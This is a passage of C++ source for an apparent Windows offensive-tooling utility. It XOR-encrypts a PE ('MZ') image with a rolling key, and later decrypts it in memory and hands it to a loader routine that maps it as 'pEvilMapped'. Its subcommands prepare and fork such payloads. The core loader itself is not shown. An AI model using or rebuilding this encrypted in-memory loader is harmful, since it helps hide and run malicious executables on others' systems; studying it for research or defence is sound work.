    DWORD dwcount = static_cast<DWORD>(data.length()) / 4;
    DWORD key = KEY_INIT;
    for (DWORD i = 0; i < dwcount; i++) {
      lpdw[i] ^= key;
      if (KEY_MUL) {
        key *= KEY_MUL;
      }
    }
    printf("Decrypted (%d DWORDS, %zd bytes)\n", dwcount, data.length());
    printf("\n");
  }

  LPVOID lpRawImage = (LPVOID)data.c_str();
  DWORD dwP2Flags = 0;
  PVOID pEvilMapped;
  return
    p2code(lpRawImage, dwP2Flags, dwPostcallRva, &pEvilMapped);
}

static int forkmz_main(int argc, wchar_t* argv[]) {
  return forkmz_main_work(false/*decrypt*/, argc, argv);
}

static int forkdemo_main(int argc, wchar_t* argv[]) {
  if (argc != 1) {
    return usage(), 1;
  }
  return
    democode();
}

static int forktbdemo_main(int argc, wchar_t* argv[]) {
  if (argc != 1) {
    return usage(), 1;
  }
  return
    tbdemocode();
}

//

static int forkmzprepared_main(int argc, wchar_t* argv[]) {
  return forkmz_main_work(true/*decrypt*/, argc, argv);
}



static int preparemz_main(int argc, wchar_t* argv[]) {
  if (argc != 2) {
    return usage(), 1;
  }
  wchar_t* inoutfile = argv[1];
  string data;
  read_entire_file(inoutfile, data);

  if (data.length() % 4 != 0) {
    printf("data must be aligned to dword\n");
    return -1;
  }
  DWORD* lpdw = (DWORD*)data.c_str();
  DWORD dwcount = static_cast<DWORD>(data.length()) / 4;
  DWORD key = KEY_INIT;
  for (DWORD i = 0; i < dwcount; i++) {
    lpdw[i] ^= key;
    if (KEY_MUL) {
      key *= KEY_MUL;
    }
  }
  write_entire_file(inoutfile, data);
  return 0;
}

// ---------------------------------------------------------------------------------------------

int wmain_worker(int argc, wchar_t* argv[]) {
  if (argc < 2) {
    return usage(), 1;
  }
  wchar_t* op = argv[1];

  if (!wcscmp(op, L"gen-mz")) {
    return genmz_main(argc - 1, &argv[1]);

  } else if (!wcscmp(op, L"gen-demo")) {
    return gendemo_main(argc - 1, &argv[1]);

  } else if (!wcscmp(op, L"gen-tbdemo")) {
    return gen_TESTBIN_demo_main(argc - 1, &argv[1]);

  } else if (!wcscmp(op, L"fork-mz")) {
    return forkmz_main(argc - 1, &argv[1]);

  }
  else if (!wcscmp(op, L"fork-demo")) {
    return forkdemo_main(argc - 1, &argv[1]);

  }
  else if (!wcscmp(op, L"fork-tbdemo")) {
    return forktbdemo_main(argc - 1, &argv[1]);

  }
  else if (!wcscmp(op, L"fork-mz-prepared")) {
    return forkmzprepared_main(argc - 1, &argv[1]);

  }
  else if (!wcscmp(op, L"prepare-mz")) {
    return preparemz_main(argc - 1, &argv[1]);

  }
  else {
    return printf("Unknown action - %S\n", op), -1;

  }
}

int wmain(int argc, wchar_t* argv[]) {

  int ret;
  try {

    ret = wmain_worker(argc, argv);
  }
  catch (exception & e) {
    cout << "Exception!! " << e.what() << "\n";
  }

  printf("p2gen_main.wmain(): returning %d\n", ret);
  return ret;
}
